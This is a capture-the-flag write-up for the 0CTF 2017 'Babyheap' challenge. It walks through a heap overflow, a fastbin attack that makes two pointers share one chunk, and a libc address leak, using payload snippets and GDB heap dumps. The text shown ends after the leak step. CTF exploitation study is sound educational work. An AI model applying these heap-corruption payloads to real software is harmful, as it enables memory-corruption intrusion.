## 0CTF 2017 - Babyheap

This is another basic heap challenge from the 0CTF which I use some different way to leak the address(That's what we always need for a heap challenge)!

### Requirements

- Find the vulnerability(heap overflow in `fill()` function)
- Leak the libc address.
- Calculat the offset of the libc base address.
- Find the place to put the one_gadget address.
- Trigger!

### Leak the address in the libc

As a heap challenge with a given libc.so, what we allways need to do is too leak the address from the libc and calculate the offset to find the base address of libc. This is also same with this challenge from 0CTF. 

From [how2heap](https://github.com/shellphish/how2heap), this challenge is under `fastbin_dup_into_stack` which is the tech we gone use to leak the address from the heap. **But, at first, I must explain why we need to leak the address this way.** When the fastbin link list only has one chunk, there's no address will be set in the `FD` and `BK` because top of the free list of fastbin will be store in the `main_arena`. So, in this case, we need to cheat the `malloc()` to return a allocated small bin size chunk as a fastbin size chunk. After we get two pointers which both point to one chunk, we can free the small bin one and it will set the `FD` and `BK` for us. That's the thing we want to leak. 

First, we need to allocate five chunks(first three are fastbin size and other two are smallbin size). The reason why we need to allocate two small bins is that if we only allocate one, when we free it, it will consolidate with the top chunk.

```
alloc(0x10) #Index 0	<- Fastbin
alloc(0x10) #Index 1	<- Fastbin
alloc(0x10) #Index 2	<- Fastbin
alloc(0x80) #Index 3	<- Small bin
alloc(0x80) #Index 4	<- Small bin
```

```
0x557c24bb9000:	0x0000000000000000	0x0000000000000021 <- Index 0
0x557c24bb9010:	0x0000000000000000	0x0000000000000000 <- 0's content
0x557c24bb9020:	0x0000000000000000	0x0000000000000021 <- Index 1
0x557c24bb9030:	0x0000000000000000	0x0000000000000000 <- 1's content
0x557c24bb9040:	0x0000000000000000	0x0000000000000021 <- Index 2 
0x557c24bb9050:	0x0000000000000000	0x0000000000000000 <- 2's content
0x557c24bb9060:	0x0000000000000000	0x0000000000000091 <- Index 3
0x557c24bb9070:	0x0000000000000000	0x0000000000000000 <- 3's content
...
0x557c24bb90e0:	0x0000000000000000	0x0000000000000000
0x557c24bb90f0:	0x0000000000000000	0x0000000000000091 <- Index 4
0x557c24bb9100:	0x0000000000000000	0x0000000000000000 <- 4's content
0x557c24bb9110:	0x0000000000000000	0x0000000000000000
...
0x557c24bb9170:	0x0000000000000000	0x0000000000000000
```

Then, we will free the 2nd chunk then the 1st chunck(Index). This will give us a free list and in the 1st chunk, we can see the address of the 2nd chunk.

```
free(2)
free(1)
```

```
fastbins
0x20: 0x560c20963020 —▸ 0x560c20963040 ◂— 0x0
0x30: 0x0
Address layout in GDB: 
pwndbg> x/40gx 0x560c20963000
0x560c20963000:	0x0000000000000000	0x0000000000000021 <- Index 0
0x560c20963010:	0x0000000000000000	0x0000000000000000
0x560c20963020:	0x0000000000000000	0x0000000000000021 <- Index 1 free
0x560c20963030:	0x0000560c20963040	0x0000000000000000 <- The address of the next free chunk in the free list
0x560c20963040:	0x0000000000000000	0x0000000000000021 <- Index 2 free
0x560c20963050:	0x0000000000000000	0x0000000000000000
0x560c20963060:	0x0000000000000000	0x0000000000000091 <- Index 3
```

### Fastbin attack

Third, because the `0x560c20963060` is the address of the 3rd chunk(Index) which is a small chunk, we need to cheat `malloc()` to allocate that chunk for us. What we gonne do is to `fill()` the 0th chunk and overflow the address in the free list from `0x560c20963040` to `0x560c20963060`. Then if we allocate same size memory from the fastbin, we can get `0x560c20963060` instead of `0x560c20963040`.

```
payload = p64(0) * 3
payload += p64(0x21)
payload += p8(0x60)
fill(payload, 0)
alloc(0x10) #Index 1
```

```
fastbins
0x20: 0x55bab90d3060 ◂— 0x0 (Compare with the above linklist, 0x40 change to 0x60)
```

For now, we get the 1st(Index) chunk from the heap but we want to get the `0x560c20963060` as the fastbin. However, if we directly request `0x10` chunk, we cannot get the `0x560c20963060` because the size of it is `0x0000000000000091` which is `0x80`(-header). So, we need to use another overflow to change `0x0000000000000091` to `0x0000000000000021`.

```
payload = p64(0) * 3
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x21)
fill(payload, 1)
alloc(0x10) #Index 2 (All the payload is for this, we want a fastbin)
```
```
0x56058fc0b000:	0x0000000000000000	0x0000000000000021 <- Index 0
0x56058fc0b010:	0x0000000000000000	0x0000000000000000
0x56058fc0b020:	0x0000000000000000	0x0000000000000021 <- Index 1
0x56058fc0b030:	0x0000000000000000	0x0000000000000000
0x56058fc0b040:	0x0000000000000000	0x0000000000000021 <- Index 2 free
0x56058fc0b050:	0x0000000000000000	0x0000000000000000
0x56058fc0b060:	0x0000000000000000	0x0000000000000021 <- Index 3 & 2 (Used to be 91)
Index 3 is the smallbin(0x80), and index 2 is the fastbin(0x10)
...
0x56058fc0b0e0:	0x0000000000000000	0x0000000000000000
0x56058fc0b0f0:	0x0000000000000000	0x0000000000000091 <- Index 4
0x56058fc0b100:	0x0000000000000000	0x0000000000000000
...
0x56058fc0b160:	0x0000000000000000	0x0000000000000000
```

Aha, now we get two pointer point to same chunk. So, we can free the small bin one to return it to the unsorted bin. The libc will set the `FD` and `BK` for us. But, again we still need to control the size of the bin. This time, because we want the chunk to be a smallbin, we need to set the size back to `0x80` at first. Then! `Dump(2)`.(As a fastbin)

```
payload = p64(0) * 3
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x91)
fill(payload, 1)
free(3)
hex(dump(2))
```
```
0x56220cde1000:	0x0000000000000000	0x0000000000000021 <- Index 0
0x56220cde1010:	0x0000000000000000	0x0000000000000000
0x56220cde1020:	0x0000000000000000	0x0000000000000021 <- Index 1
0x56220cde1030:	0x0000000000000000	0x0000000000000000
0x56220cde1040:	0x0000000000000000	0x0000000000000021 <- Index 2 free
0x56220cde1050:	0x0000000000000000	0x0000000000000000
0x56220cde1060:	0x0000000000000000	0x0000000000000091 <- Index 3 & 2 free
0x56220cde1070:	0x00007fc036f48b78	0x00007fc036f48b78 <- That's what we want!!!!
...
0x56220cde10e0:	0x0000000000000000	0x0000000000000000
0x56220cde10f0:	0x0000000000000090	0x0000000000000090 <- Index 4(P is not set)
0x56220cde1100:	0x0000000000000000	0x0000000000000000
...
0x56220cde1170:	0x0000000000000000	0x0000000000000000
```
